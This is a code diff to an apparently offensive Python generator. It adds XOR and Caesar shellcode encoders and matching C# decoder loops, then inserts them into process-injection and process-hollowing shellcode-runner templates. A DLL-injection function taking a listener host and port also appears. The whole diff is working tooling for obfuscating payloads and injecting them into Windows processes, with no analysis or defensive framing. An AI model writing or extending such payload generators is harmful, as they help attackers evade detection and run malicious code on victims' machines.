@@ -12,7 +12,7 @@ def read_file(f):
             content = fs.read()
         return content
 
-def shellcodeEncoder(shellcode):
+def shellcodeEncoder(technique, shellcode):
     # Python shellcode encoder 
     shellcode = "".join(shellcode.splitlines())
     #print(shellcode)
@@ -23,49 +23,87 @@ def shellcodeEncoder(shellcode):
     shellcode_chars = shellcode.split(",") 
     shellcode_chars = list(filter(None, shellcode_chars))
 
-    encoded_shellcode_chars = []
+    #cesar encoder
+    cesar_encoded_shellcode_chars = []
     for c in shellcode_chars:
-        encoded_shellcode_chars.append("0x{:02x}".format(int(c,16)+2 & 0xFF))
-    
-    return (shellcode_start + " {"+ ",".join(encoded_shellcode_chars) + "};")
+        cesar_encoded_shellcode_chars.append("0x{:02x}".format(int(c,16)+2 & 0xFF))
 
-def generateProcessInjection(shellcode, arch):
+    # xor encoder
+    xor_encoded_shellcode_chars = []
+    for c in shellcode_chars:
+        xor_encoded_shellcode_chars.append("0x{:02x}".format(int(c,16)^0xfa & 0xFF))
+
+    if (technique == "xor"):
+        result = xor_encoded_shellcode_chars
+    elif (technique == "cesar"):
+        result = cesar_encoded_shellcode_chars
+    
+    return (shellcode_start + " {"+ ",".join(result) + "};")
+
+
+
+def shellcodeDecoder(technique):
+    if (technique == "xor"):
+        text = """
+            //XOR decoder
+            for(int i = 0; i < buf.Length; i++)
+            {
+                buf[i] = (byte)(((uint)buf[i] ^ 0xfa) & 0xFF);
+            }
+"""
+    elif (technique == "cesar"):
+        text = """
+            //Cesar decoder
+            for(int i = 0; i < buf.Length; i++)
+            {
+                buf[i] = (byte)(((uint)buf[i] - 2) & 0xFF);
+            }
+"""
+    return text
+
+
+def generateProcessInjection(technique, shellcode, arch):
     print("[+] Process Injection")
  
     print(colored(f"    [+] Generating C# Process Injection exploit", 'green'))
 
 
     # Python shellcode encoder  
-    encoded_shellcode = shellcodeEncoder(shellcode)
+    encoded_shellcode = shellcodeEncoder(technique, shellcode)
+    shellcode_decoder = shellcodeDecoder(technique)
 
 
     # C# shellcode runner
     template_name = "cs_process_injection.cs"
     template = read_file("templates/" + template_name)
     template_out = template.replace("%ENCSHELLCODE%", encoded_shellcode )
+    template_out = template_out.replace("%DECODER%", shellcode_decoder)
     
     f = open(f"output/process_migration/{arch}/" + template_name, 'w')
     f.write(template_out)
     f.close()
 
-def generateProcessHollowing(shellcode, arch):
+def generateProcessHollowing(technique, shellcode, arch):
     print("[+] Process hollowing")
  
     print(colored(f"    [+] Generating C# Process Hollowing exploit", 'green'))
 
 
     # Python shellcode encoder  
-    encoded_shellcode = shellcodeEncoder(shellcode)
+    encoded_shellcode = shellcodeEncoder(technique, shellcode)
+    shellcode_decoder = shellcodeDecoder(technique)
 
 
     # C# shellcode runner
     template_name = "cs_process_hollowing.cs"
     template = read_file("templates/" + template_name)
     template_out = template.replace("%ENCSHELLCODE%", encoded_shellcode )
+    template_out = template_out.replace("%DECODER%", shellcode_decoder)
     
     f = open(f"output/process_migration/{arch}/" + template_name, 'w')
     f.write(template_out)
     f.close()
+
 
 def dllInection(lhost, lport, arch):
     print("[+] DLL injection")
